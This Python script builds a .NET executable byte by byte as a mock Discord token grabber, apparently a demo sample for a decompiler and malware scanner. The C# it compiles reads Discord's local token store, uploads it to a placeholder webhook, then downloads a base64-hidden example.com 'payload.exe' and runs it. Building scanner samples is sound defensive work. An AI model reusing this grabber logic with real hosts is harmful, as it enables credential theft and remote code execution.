#!/usr/bin/env python3
"""Builds public/samples/sample-dotnet.exe: a tiny, harmless .NET Framework console exe that
looks like a Discord token grabber (fake webhook, base64-hidden download URL, Process.Start),
so EZLARP's .NET decompiler and scanner have something to show. It is written byte by byte
(ECMA-335) because no C# compiler is needed to make it. The webhook and URLs are fake.

The C# it corresponds to:

    namespace Demo {
      public static class Program {
        public static void Main(string[] args) { Console.WriteLine("Loading cheats..."); Grabber.Run(); }
      }
      public class Grabber {
        private static readonly string Hook = "https://discord.com/api/webhooks/1234567890/sample-not-a-real-hook";
        private static string Encoded = "aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLmV4ZQ==";
        public static void Run() {
          string text = Environment.GetEnvironmentVariable("APPDATA") + "\\\\discord\\\\Local Storage\\\\leveldb\\\\000005.ldb";
          if (File.Exists(text)) Send(File.ReadAllText(text));
          for (int i = 0; i < 3; i++) Thread.Sleep(100);
          string url = Encoding.UTF8.GetString(Convert.FromBase64String(Encoded));
          new WebClient().DownloadFile(url, "update.exe");
          Process.Start("update.exe");
        }
        private static void Send(string body) {
          try { new WebClient().UploadString(Hook, body); } catch (Exception) { }
        }
      }
    }
"""
import struct, sys, os

out_path = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(__file__), '..', '..', 'public', 'samples', 'sample-dotnet.exe')

def cu(n):  # compressed unsigned
    if n < 0x80: return bytes([n])
    if n < 0x4000: return bytes([0x80 | (n >> 8), n & 0xff])
    return bytes([0xc0 | (n >> 24), (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])

class Heap:
    def __init__(self, first=b'\0'): self.data = bytearray(first); self.index = {}
    def add(self, key, raw):
        if key in self.index: return self.index[key]
        i = len(self.data); self.data += raw; self.index[key] = i; return i
strings, blobs, us = Heap(), Heap(), Heap()
S = lambda s: strings.add(s, s.encode() + b'\0') if s else 0
B = lambda b: blobs.add(bytes(b), cu(len(b)) + bytes(b))
def U(s):
    raw = s.encode('utf-16-le')
    special = set(range(1, 9)) | set(range(0x0e, 0x20)) | {0x27, 0x2d, 0x7f}
    flag = 1 if any(ord(c) > 0xff or ord(c) in special for c in s) else 0
    return 0x70000000 | us.add(s, cu(len(raw) + 1) + raw + bytes([flag]))

# ---- type references
ASM_MSCORLIB, ASM_SYSTEM = 1, 2
typerefs = [('System', 'Object', 1), ('System', 'Console', 1), ('System', 'Environment', 1), ('System', 'String', 1), ('System.IO', 'File', 1),
            ('System.Threading', 'Thread', 1), ('System.Text', 'Encoding', 1), ('System', 'Convert', 1), ('System.Net', 'WebClient', 2),
            ('System.Diagnostics', 'Process', 2), ('System', 'Exception', 1)]
TR = {name: i + 1 for i, (_, name, _) in enumerate(typerefs)}
tdor = lambda table_tag, rid: cu((rid << 2) | table_tag)  # 0 TypeDef, 1 TypeRef
cls = lambda name: b'\x12' + tdor(1, TR[name])
STR, VOID, BOOL, I4, U1 = b'\x0e', b'\x01', b'\x02', b'\x08', b'\x05'
msig = lambda inst, ret, *ps: bytes([0x20 if inst else 0x00, len(ps)]) + ret + b''.join(ps)

memberrefs = [  # (typeref, name, sig)
    ('Object', '.ctor', msig(1, VOID)), ('Console', 'WriteLine', msig(0, VOID, STR)), ('Environment', 'GetEnvironmentVariable', msig(0, STR, STR)),
    ('String', 'Concat', msig(0, STR, STR, STR)), ('File', 'Exists', msig(0, BOOL, STR)), ('File', 'ReadAllText', msig(0, STR, STR)),
    ('Thread', 'Sleep', msig(0, VOID, I4)), ('Encoding', 'get_UTF8', msig(0, cls('Encoding'))), ('Convert', 'FromBase64String', msig(0, b'\x1d' + U1, STR)),
    ('Encoding', 'GetString', msig(1, STR, b'\x1d' + U1)), ('WebClient', '.ctor', msig(1, VOID)), ('WebClient', 'DownloadFile', msig(1, VOID, STR, STR)),
    ('Process', 'Start', msig(0, cls('Process'), STR)), ('WebClient', 'UploadString', msig(1, STR, STR, STR)),
]
MR = {(t, n): 0x0a000000 | (i + 1) for i, (t, n, _) in enumerate(memberrefs)}
FIELD_HOOK, FIELD_ENC = 0x04000001, 0x04000002
M_MAIN, M_RUN, M_SEND, M_CTOR, M_CCTOR = (0x06000000 | i for i in range(1, 6))

# ---- tiny IL assembler
OP = {'ldarg.0': 0x02, 'ldloc.0': 0x06, 'ldloc.1': 0x07, 'ldloc.2': 0x08, 'stloc.0': 0x0a, 'stloc.1': 0x0b, 'stloc.2': 0x0c, 'ldc.i4.0': 0x16, 'ldc.i4.1': 0x17,
      'ldc.i4.3': 0x19, 'ldc.i4.s': 0x1f, 'pop': 0x26, 'call': 0x28, 'ret': 0x2a, 'br.s': 0x2b, 'brfalse.s': 0x2c, 'blt.s': 0x32, 'add': 0x58,
      'callvirt': 0x6f, 'ldstr': 0x72, 'newobj': 0x73, 'ldsfld': 0x7e, 'stsfld': 0x80, 'leave.s': 0xde}
def il(prog):
    # first pass: offsets of labels
    labels, size = {}, 0
    for ins in prog:
        if isinstance(ins, str) and ins.endswith(':'): labels[ins[:-1]] = size; continue
        name = ins[0]
        size += 1 + (4 if name in ('call', 'callvirt', 'ldstr', 'newobj', 'ldsfld', 'stsfld') else 1 if name in ('ldc.i4.s', 'br.s', 'brfalse.s', 'blt.s', 'leave.s') else 0)
    code = bytearray()
    for ins in prog:
        if isinstance(ins, str): continue
        name, arg = ins[0], ins[1] if len(ins) > 1 else None
        code.append(OP[name])
        if name in ('call', 'callvirt', 'ldstr', 'newobj', 'ldsfld', 'stsfld'): code += struct.pack('<I', arg)
        elif name == 'ldc.i4.s': code.append(arg & 0xff)
        elif name in ('br.s', 'brfalse.s', 'blt.s', 'leave.s'): code += struct.pack('<b', labels[arg] - (len(code) + 1))
    return bytes(code), labels

def tiny(code): return bytes([(len(code) << 2) | 2]) + code
def fat(code, maxstack, localtok, eh=None):
    flags = 0x3003 | (0x10 if localtok else 0) | (0x08 if eh else 0)
    out = struct.pack('<HHII', flags, maxstack, len(code), localtok) + code
    if eh:
        out += b'\0' * ((4 - len(out) % 4) % 4)
        clauses = b''.join(struct.pack('<HHBHBI', fl, to, tl, ho, hl, tok) for fl, to, tl, ho, hl, tok in eh)
        out += struct.pack('<BBH', 0x01, 4 + len(clauses), 0) + clauses
    return out

main_code, _ = il([('ldstr', U('Loading cheats...')), ('call', MR[('Console', 'WriteLine')]), ('call', M_RUN), ('ret',)])
run_code, _ = il([
    ('ldstr', U('APPDATA')), ('call', MR[('Environment', 'GetEnvironmentVariable')]), ('ldstr', U('\\discord\\Local Storage\\leveldb\\000005.ldb')),
    ('call', MR[('String', 'Concat')]), ('stloc.0',), ('ldloc.0',), ('call', MR[('File', 'Exists')]), ('brfalse.s', 'L1'),
    ('ldloc.0',), ('call', MR[('File', 'ReadAllText')]), ('call', M_SEND),
    'L1:', ('ldc.i4.0',), ('stloc.2',), ('br.s', 'COND'),
    'BODY:', ('ldc.i4.s', 100), ('call', MR[('Thread', 'Sleep')]), ('ldloc.2',), ('ldc.i4.1',), ('add',), ('stloc.2',),
    'COND:', ('ldloc.2',), ('ldc.i4.3',), ('blt.s', 'BODY'),
    ('call', MR[('Encoding', 'get_UTF8')]), ('ldsfld', FIELD_ENC), ('call', MR[('Convert', 'FromBase64String')]), ('callvirt', MR[('Encoding', 'GetString')]), ('stloc.1',),
    ('newobj', MR[('WebClient', '.ctor')]), ('ldloc.1',), ('ldstr', U('update.exe')), ('callvirt', MR[('WebClient', 'DownloadFile')]),
    ('ldstr', U('update.exe')), ('call', MR[('Process', 'Start')]), ('pop',), ('ret',)])
send_code, sl = il(['TRY:', ('newobj', MR[('WebClient', '.ctor')]), ('ldsfld', FIELD_HOOK), ('ldarg.0',), ('callvirt', MR[('WebClient', 'UploadString')]), ('pop',),
                    ('leave.s', 'END'), 'CATCH:', ('pop',), ('leave.s', 'END'), 'END:', ('ret',)])
ctor_code, _ = il([('ldarg.0',), ('call', MR[('Object', '.ctor')]), ('ret',)])
cctor_code, _ = il([('ldstr', U('https://discord.com/api/webhooks/1234567890/sample-not-a-real-hook')), ('stsfld', FIELD_HOOK),
                    ('ldstr', U('aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLmV4ZQ==')), ('stsfld', FIELD_ENC), ('ret',)])
LOCALS_RUN = 0x11000001
bodies = [tiny(main_code), fat(run_code, 3, LOCALS_RUN), fat(send_code, 3, 0, [(0, sl['TRY'], sl['CATCH'] - sl['TRY'], sl['CATCH'], sl['END'] - sl['CATCH'], 0x01000000 | TR['Exception'])]),
          tiny(ctor_code), tiny(cctor_code)]

# ---- layout of .text: IAT, CLI header, method bodies, metadata, imports, entry stub
TEXT_RVA, BASE = 0x2000, 0x400000
text = bytearray(8 + 72)  # IAT (8) + CLI header (72), filled in later
body_rva = []
for bd in bodies:
    while len(text) % 4: text.append(0)
    body_rva.append(TEXT_RVA + len(text)); text += bd

# ---- metadata tables
def u16(*v): return struct.pack('<' + 'H' * len(v), *v)
def u32(*v): return struct.pack('<' + 'I' * len(v), *v)
rows = {}
rows[0x00] = [u16(0, S('SampleGrabber.exe'), 1, 0, 0)]
rows[0x01] = [u16((scope << 2) | 2, S(name), S(ns)) for ns, name, scope in typerefs]
ext_obj = (TR['Object'] << 2) | 1
rows[0x02] = [u32(0) + u16(S('<Module>'), 0, 0, 1, 1),
              u32(0x00100181) + u16(S('Program'), S('Demo'), ext_obj, 1, 1),
              u32(0x00100001) + u16(S('Grabber'), S('Demo'), ext_obj, 1, 2)]
rows[0x04] = [u16(0x31, S('Hook'), B(b'\x06\x0e')), u16(0x11, S('Encoded'), B(b'\x06\x0e'))]
rows[0x06] = [u32(body_rva[0]) + u16(0, 0x96, S('Main'), B(msig(0, VOID, b'\x1d' + STR)), 1),
              u32(body_rva[1]) + u16(0, 0x96, S('Run'), B(msig(0, VOID)), 2),
              u32(body_rva[2]) + u16(0, 0x91, S('Send'), B(msig(0, VOID, STR)), 2),
              u32(body_rva[3]) + u16(0, 0x1886, S('.ctor'), B(msig(1, VOID)), 3),
              u32(body_rva[4]) + u16(0, 0x1891, S('.cctor'), B(msig(0, VOID)), 3)]
rows[0x08] = [u16(0, 1, S('args')), u16(0, 1, S('body'))]
rows[0x0a] = [u16((TR[t] << 3) | 1, S(n), B(sig)) for t, n, sig in memberrefs]
rows[0x11] = [u16(B(b'\x07\x03' + STR + STR + I4))]
rows[0x20] = [u32(0x8004) + u16(1, 0, 0, 0) + u32(0) + u16(0, S('SampleGrabber'), 0)]
token = bytes.fromhex('b77a5c561934e089')
rows[0x23] = [u16(4, 0, 0, 0) + u32(0) + u16(B(token), S('mscorlib'), 0, 0), u16(4, 0, 0, 0) + u32(0) + u16(B(token), S('System'), 0, 0)]
valid = sum(1 << t for t in rows)
tables = u32(0) + bytes([2, 0, 0, 1]) + struct.pack('<QQ', valid, 0x000016003301FA00) + b''.join(u32(len(rows[t])) for t in sorted(rows))
tables += b''.join(b''.join(rows[t]) for t in sorted(rows))
guid = bytes.fromhex('5a1e0c3b7d2f4e6a9b8c1d2e3f405162')
pad4 = lambda b: bytes(b) + b'\0' * ((4 - len(b) % 4) % 4)
streams = [('#~', pad4(tables)), ('#Strings', pad4(strings.data)), ('#US', pad4(us.data)), ('#GUID', guid), ('#Blob', pad4(blobs.data))]
ver = pad4(b'v4.0.30319\0')
hdr_len = 16 + len(ver) + 4 + sum(8 + len(pad4((n + '\0').encode())) for n, _ in streams)
md = bytearray(u32(0x424A5342) + u16(1, 1) + u32(0) + u32(len(ver)) + ver + u16(0, len(streams)))
off = hdr_len
for n, d in streams:
    md += u32(off, len(d)) + pad4((n + '\0').encode()); off += len(d)
for _, d in streams: md += d
while len(text) % 4: text.append(0)
md_rva = TEXT_RVA + len(text); text += md

# ---- imports: mscoree.dll!_CorExeMain, and the classic "jmp [IAT]" entry stub
while len(text) % 4: text.append(0)
imp_rva = TEXT_RVA + len(text); text += bytes(40)
ilt_rva = TEXT_RVA + len(text); text += bytes(8)
hint_rva = TEXT_RVA + len(text); text += b'\0\0_CorExeMain\0'
while len(text) % 2: text.append(0)
dll_rva = TEXT_RVA + len(text); text += b'mscoree.dll\0'
while len(text) % 4: text.append(0)
text += b'\0\0'
stub_rva = TEXT_RVA + len(text); text += b'\xff\x25' + u32(BASE + TEXT_RVA)
struct.pack_into('<II', text, 0, hint_rva, 0)                                   # IAT
struct.pack_into('<II', text, ilt_rva - TEXT_RVA, hint_rva, 0)                  # ILT
struct.pack_into('<IIIII', text, imp_rva - TEXT_RVA, ilt_rva, 0, 0, dll_rva, TEXT_RVA)
struct.pack_into('<IHHIIIIIIIIIIIIIIII', text, 8, 72, 2, 5, md_rva, len(md), 1, M_MAIN, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)

# ---- .reloc: the absolute address inside the entry stub
RELOC_RVA = 0x4000
page = stub_rva & ~0xfff
reloc = u32(page, 12) + u16((3 << 12) | (stub_rva + 2 - page), 0)

# ---- PE file
FA, SA = 0x200, 0x2000
align = lambda n, a: (n + a - 1) // a * a
text_raw = align(len(text), FA)
dos = bytearray(0x80); dos[0:2] = b'MZ'; struct.pack_into('<I', dos, 0x3c, 0x80)
stub_msg = b'\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$'
dos[0x40:0x40 + len(stub_msg)] = stub_msg
coff = b'PE\0\0' + struct.pack('<HHIIIHH', 0x14c, 2, 0, 0, 0, 0xe0, 0x0102)
size_image = align(RELOC_RVA + len(reloc), SA)
opt = struct.pack('<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII', 0x10b, 8, 0, text_raw, FA, 0, stub_rva, TEXT_RVA, RELOC_RVA, BASE, SA, FA,
                  4, 0, 0, 0, 4, 0, 0, size_image, FA, 0, 3, 0x8540, 0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
dirs = [(0, 0)] * 16
dirs[1] = (imp_rva, 40); dirs[5] = (RELOC_RVA, len(reloc)); dirs[12] = (TEXT_RVA, 8); dirs[14] = (TEXT_RVA + 8, 72)
opt += b''.join(struct.pack('<II', *d) for d in dirs)
sec = lambda name, vsize, va, rsize, raw, ch: struct.pack('<8sIIIIIIHHI', name, vsize, va, rsize, raw, 0, 0, 0, 0, ch)
headers = bytes(dos) + coff + opt + sec(b'.text', len(text), TEXT_RVA, text_raw, FA, 0x60000020) + sec(b'.reloc', len(reloc), RELOC_RVA, FA, FA + text_raw, 0x42000040)
pe = headers + b'\0' * (FA - len(headers)) + bytes(text) + b'\0' * (text_raw - len(text)) + reloc + b'\0' * (FA - len(reloc))
open(out_path, 'wb').write(pe)
print('wrote', out_path, len(pe), 'bytes')
